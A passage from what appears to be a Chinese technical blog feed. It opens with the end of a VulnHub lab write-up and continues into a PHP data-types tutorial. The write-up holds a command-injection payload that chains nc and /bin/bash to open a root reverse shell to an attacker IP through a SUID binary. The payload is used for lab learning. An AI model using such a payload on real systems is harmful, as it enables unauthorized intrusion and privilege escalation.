<p>靶机执行如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./update_cloudav &quot;a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666&quot;</span><br></pre></td></tr></table></figure></p>
<p>注意，（<strong>一定要在最前面加上|,就算没有a，也要有|</strong>）这样构成的命令就是这样：
<code>/usr/bin/freshclam a|nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>，这是一个完整的命令，是可以被执行的。</p>
<p>如果前面没有|，则构成<code>/usr/bin/freshclam nc 192.168.137.104 5555|/bin/bash|nc 192.168.137.104 6666</code>，会先执行
<code>/usr/bin/freshclam nc 192.168.137.104 5555</code>，这样子nc串联就断开了，无法获得shell。</p>
<p>最终成功获得 root 权限！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329225809.png" /></p>
<h1 id="总结">总结</h1>
<p>通过对该虚拟机的渗透，学到了：</p>
<ol type="1">
<li><code>arping</code> 进行主机发现</li>
<li>nc串联反弹shell</li>
<li>suid提权</li>
</ol>
<p>疑点：访问 http 服务那有一个地方需要输入 pin 码，还没找到</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>2. 数据类型</title>
    <url>/2022/11/17/2.%20%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="简介">1. 简介</h1>
<p>PHP 支持 8 种原始的数据类型，其中分为：</p>
<ol type="1">
<li>4 种标量类型；
<ol type="1">
<li>Boolean</li>
<li>Interger</li>
<li>Float 或者 double</li>
<li>String</li>
</ol></li>
<li>2 种复合类型；
<ol type="1">
<li>Array</li>
<li>Object</li>
</ol></li>
<li>2 种特殊类型；
<ol type="1">
<li>Resource</li>
<li>NULL</li>
</ol></li>
</ol>
<p>为了确保代码的易读性，还有一些伪类型：</p>
<ol type="1">
<li>Mixed</li>
<li>Number</li>
<li>Callback</li>
</ol>
<p>关于变量的值与类型的操作：</p>
<ol type="1">
<li>查看某个变量的 <strong>类型</strong>，可以使用函数
<code>gettype(变量名)</code>；</li>
<li>查看某个变量的 <strong>值和类型</strong>，可以使用函数
<code>var_dump(变量名)</code>；</li>
<li>强制改变类型，但原变量的类型没有发生改变，而是生成新的指定类型的变量，方式
<code>$new_var = (type)var</code>；</li>
<li>永久性改变类型，直接改变原变量的类型，而不生成新的变量，使用函数
<code>settype(var, type)</code>；</li>
<li>判断变量的类型，可以使用 <code>is_type(var)</code>；</li>
</ol>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 创建三个变量</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line"><span class="variable">$is_married</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看变量类型</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;name type: &#x27;</span>.gettype(<span class="variable">$name</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;age type: &#x27;</span>.gettype(<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;is_married type: &#x27;</span>.gettype(<span class="variable">$is_married</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看变量的值与类型</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;name type and value: &#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$name</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;age type and value: &#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;is_married type and value: &#x27;</span>;</span><br><span class="line">var_dump(<span class="variable">$is_married</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强制改变类型，原变量的类型没有发生变化，生成新的类型的变量</span></span><br><span class="line"><span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$age</span>;</span><br><span class="line"><span class="keyword">if</span> (is_string(<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$str 是 string type&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$str 不是 string type&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_string(<span class="variable">$age</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$age 是 string type&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$age 不是 string type&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 永久性类型转换：settype(var, type)</span></span><br><span class="line">settype(<span class="variable">$age</span>, <span class="string">&#x27;string&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (is_string(<span class="variable">$age</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$age 是 string type&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$age 不是 string type&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="boolean">2. Boolean</h1>
<p>PHP 中最简单的类型，只有两个值（不区分大小写）：</p>
<ol type="1">
<li><code>true</code></li>
<li><code>false</code></li>
</ol>
<p>布尔值在流程控制中的应用，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="literal">True</span>;</span><br><span class="line"><span class="keyword">echo</span> gettype(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$flag</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;OK&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Bad&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115163033.png" /></p>
<p><strong>该类型的重点：判断哪些值可以转为 boolean 类型？</strong></p>
<p>如果我们直接输出布尔值，会显示什么呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115163441.png" /></p>
<p>会发现，只有 <code>true</code> 会显示，并且值为 1，而
<code>false</code> 甚至连 0 都不是。</p>
<p>根据对其他编程语言的理解，有以下值可以转为布尔值，并且布尔值为
false：</p>
<ol type="1">
<li>数字 0；</li>
<li>空字符串；</li>
<li><code>null</code></li>
<li>空列表；</li>
</ol>
<p>还有一个非常反人类的值也可以转为布尔值的 false，那就是
<code>'0'</code>，单字符 0！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump((<span class="keyword">bool</span>)<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump((<span class="keyword">bool</span>)<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump((<span class="keyword">bool</span>)<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump((<span class="keyword">bool</span>)<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump((<span class="keyword">bool</span>)[]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115163748.png" /></p>
<p>其他的值转为布尔类型之后值都为 <code>true</code>。总结一下 5
个值的布尔值为 <code>false</code> ：</p>
<ol type="1">
<li>数字 0；</li>
<li>空字符串；</li>
<li><code>null</code></li>
<li>空列表；</li>
<li>单字符 0；</li>
</ol>
<h1 id="integer">3. Integer</h1>
<p>Integer 不只包含十进制，还可以表示 8 进制和 16 进制。其中：</p>
<ol type="1">
<li>8 进制以 0 开头；</li>
<li>16 进制以 0x 开头；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="number">927</span>);  <span class="comment"># 十进制</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="number">023</span>);  <span class="comment"># 8进制，以0开头</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">var_dump(<span class="number">0xa</span>);  <span class="comment"># 16进制，以0x开头</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115164411.png" /></p>
<p>根据结果也可以知道，不论是什么进制的数，最终都是以十进制方式显示。</p>
<p>查看本机最大正数：<code>PHP_INT_MAX</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(PHP_INT_MAX);</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115164522.png" /></p>
<p>这是一个很大的数，不过有一个问题，这是本机的能够表达的最大整数，如果在此基础上加
1 会发生什么呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(PHP_INT_MAX);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MAX + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115164609.png" /></p>
<p>会发现，当超过 <code>PHP_INT_MAX</code> 时，会自动转为 float
类型。</p>
<p><strong>重点：其他类型转为 integer 时的值。</strong>
其他类型的变量转为 integer 时有两种方式：</p>
<ol type="1">
<li><code>(int)var</code>；</li>
<li><code>intval(var)</code></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump((<span class="keyword">int</span>)<span class="literal">true</span>);</span><br><span class="line">var_dump((<span class="keyword">int</span>)<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(intval(<span class="literal">true</span>));</span><br><span class="line">var_dump(intval(<span class="literal">false</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115165105.png" /></p>
<p>结论：<code>true</code> 的 int 值为 1，<code>false</code> 的 int 值为
0；</p>
<p>接下来是一个特别恶心的地方（会发生 <strong>弱类型比较漏洞</strong>
），那就是字符串转为 integer：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(intval(<span class="string">&#x27;php&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">var_dump(intval(<span class="string">&#x27;123hp&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">var_dump(intval(<span class="string">&#x27;02313fasdf&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">var_dump(intval(<span class="string">&#x27;dfsa34fa&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115165351.png" /></p>
<p>结论</p>
<ol type="1">
<li>字符串转为 integer 的值为 0；</li>
<li>如果字符串最前面是数字，则转为 integer 后的值为前面的
<strong>有效数字</strong>；</li>
<li>字符串中间的数字不影响转为 integer 后的值；</li>
</ol>
<h1 id="float">4. Float</h1>
<p>可以使用以下任一语法定义：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1.234</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">1.2e3</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="number">3e-10</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>其他类型转为浮点数也有两种方式：</p>
<ol type="1">
<li><code>(float)var</code>；</li>
<li><code>floatval(var)</code>；</li>
</ol>
<p>其他类型转为浮点数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;string -&gt; float:&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump(floatval(<span class="string">&#x27;12.36&#x27;</span>));</span><br><span class="line">var_dump(floatval(<span class="string">&#x27;php&#x27;</span>));</span><br><span class="line">var_dump(floatval(<span class="string">&#x27;23.23php&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;boolean -&gt; float:&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump(floatval(<span class="literal">true</span>));</span><br><span class="line">var_dump(floatval(<span class="literal">false</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;integer -&gt; float:&lt;br&gt;&#x27;</span>;</span><br><span class="line">var_dump(floatval(<span class="number">123</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115174344.png" /></p>
<p>结论：</p>
<ol type="1">
<li>字符串转为浮点数的规则同字符串转为整数；</li>
<li>布尔类型转为浮点数也与布尔类型转为整数差不多；</li>
</ol>
<h1 id="string">5. String</h1>
<p>字符串可以用 4 中方式表达：</p>
<ol type="1">
<li>单引号；（单引号中有单引号需要转义 <code>\</code>）</li>
<li>双引号；（双引号中有双引号也需要转义 <code>\</code>）</li>
<li><code>heredoc</code> 语法结构；</li>
<li><code>nowdoc</code> 语法结构；（自 <code>PHP 5.3.0</code>
起）；</li>
</ol>
<p>介绍第一种，单引号创建的字符串就是普通的字符串，如果字符串中出现单引号，需要使用
<code>\</code> 转义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 单引号</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115180039.png" /></p>
<p>使用双引号创建的字符串与单引号创建的最大不同：可以解析变量。但遇到双引号也需要进行转义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 单引号</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 双引号创建的字符串，可以解析变量</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;hello, <span class="subst">&#123;$name&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115180130.png" /></p>
<p>可以看到 <code>$name</code> 被成功解析。</p>
<blockquote>
<p>变量也可以不用 <code>&#123;&#125;</code>
包含，但是为了与字符作区分，为了易读性，所以用 <code>&#123;&#125;</code>。</p>
</blockquote>
<p>使用 <code>heredoc</code>
语法创建的字符串与用双引号创建的相同，也可以解析变量，不同就是出现双引号不用转义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 单引号</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 双引号创建的字符串，可以解析变量</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;hello, <span class="subst">&#123;$name&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># heredoc，同双引号，但双引号不需要转义</span></span><br><span class="line"><span class="variable">$net_name</span> = <span class="string">&#x27;百度&#x27;</span>;</span><br><span class="line"><span class="variable">$domain</span> = <span class="string">&#x27;baidu.com&#x27;</span>;</span><br><span class="line"><span class="variable">$heredoc</span> = <span class="string">&lt;&lt;&lt;LIST</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;&lt;a href=&quot;https://www.baidu.com&quot;&gt;<span class="subst">$net_name</span>&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;&lt;a href=&quot;https://www.baidu.com&quot;&gt;<span class="subst">&#123;$domain&#125;</span>&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">LIST</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$heredoc</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115180322.png" /></p>
<p>需要注意的是 <strong>写法</strong>：</p>
<ol type="1">
<li><code>&lt;&lt;&lt;LIST</code>
怎么写无所谓，可以直接写在等号后面，也可以另起一行，还可以
<code>&lt;&lt;&lt; LIST</code>；</li>
<li>结尾的 <code>LIST</code>
需要注意，最好顶格写，如果不顶格写，需要保证 <code>LIST</code>
之间的内容的缩进要比结尾的 <code>LIST</code> 多；</li>
</ol>
<p>使用 <code>nowdoc</code>
创建的字符串与单引号相同，无法解析变量，也可以与双引号相同，解析变量，这取决于开头的
<code>&lt;&lt;&lt;'EOD'</code> 是单引号还是
<code>&lt;&lt;&lt;"EOD"</code> 双引号。与 <code>heredoc</code>
类似，遇到单引号也不需要转义。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 单引号</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 双引号创建的字符串，可以解析变量</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;hello, <span class="subst">&#123;$name&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># heredoc，同双引号，但双引号不需要转义</span></span><br><span class="line"><span class="variable">$net_name</span> = <span class="string">&#x27;百度&#x27;</span>;</span><br><span class="line"><span class="variable">$domain</span> = <span class="string">&#x27;baidu.com&#x27;</span>;</span><br><span class="line"><span class="variable">$heredoc</span> = <span class="string">&lt;&lt;&lt;LIST</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;&lt;a href=&quot;https://www.baidu.com&quot;&gt;<span class="subst">$net_name</span>&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;&lt;a href=&quot;https://www.baidu.com&quot;&gt;<span class="subst">&#123;$domain&#125;</span>&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">LIST</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$heredoc</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># nowdoc，同单引号</span></span><br><span class="line"><span class="variable">$nowdoc</span> = &lt;&lt;&lt;<span class="string">&#x27;EOD&#x27;</span></span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li&gt;this is test1&#123;<span class="variable">$net_name</span>&#125;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;this is test2&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">EOD;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nowdoc</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115180903.png" /></p>
<p>也需要注意 <strong>写法</strong>：</p>
<ol type="1">
<li><code>EOD</code> 和 <code>&lt;&lt;&lt;'EOD'</code> 与
<code>heredoc</code> 一样的规则；</li>
<li>除此之外，结尾的 <code>EOD</code> 不需要加引号；</li>
<li>更奇妙的是，如果开头的 <code>EOD</code> 使用了双引号，则可以起到与
<code>heredoc</code> 一样的效果；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 单引号</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 双引号创建的字符串，可以解析变量</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;hello, <span class="subst">&#123;$name&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># heredoc，同双引号，但双引号不需要转义</span></span><br><span class="line"><span class="variable">$net_name</span> = <span class="string">&#x27;百度&#x27;</span>;</span><br><span class="line"><span class="variable">$domain</span> = <span class="string">&#x27;baidu.com&#x27;</span>;</span><br><span class="line"><span class="variable">$heredoc</span> = <span class="string">&lt;&lt;&lt;LIST</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;&lt;a href=&quot;https://www.baidu.com&quot;&gt;<span class="subst">$net_name</span>&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li&gt;&lt;a href=&quot;https://www.baidu.com&quot;&gt;<span class="subst">&#123;$domain&#125;</span>&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;/ul&gt;</span></span><br><span class="line"><span class="string">LIST</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$heredoc</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># nowdoc，同单引号</span></span><br><span class="line"><span class="variable">$nowdoc1</span> = </span><br><span class="line">&lt;&lt;&lt;<span class="string">&#x27;EOD&#x27;</span></span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li&gt;this is test1&#123;<span class="variable">$net_name</span>&#125;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;this is test2&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">EOD;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nowdoc1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># nowdoc，同单引号</span></span><br><span class="line"><span class="variable">$nowdoc2</span> = </span><br><span class="line">&lt;&lt;&lt;<span class="string">&quot;EOD&quot;</span></span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li&gt;this is test1&#123;<span class="variable">$net_name</span>&#125;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;this is test2&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">EOD;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nowdoc2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221115181229.png" /></p>
<h1 id="array">6. Array</h1>
<h2 id="数组的创建">6.1. 数组的创建</h2>
<p>PHP 中的数组基本语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arrayName</span> = <span class="keyword">array</span>(</span><br><span class="line">	key1 =&gt; value1,</span><br><span class="line">	key2 =&gt; value2,</span><br><span class="line">	key3 =&gt; value3,</span><br><span class="line">	...</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<pre><code>这是 Python 中的字典。</code></pre>
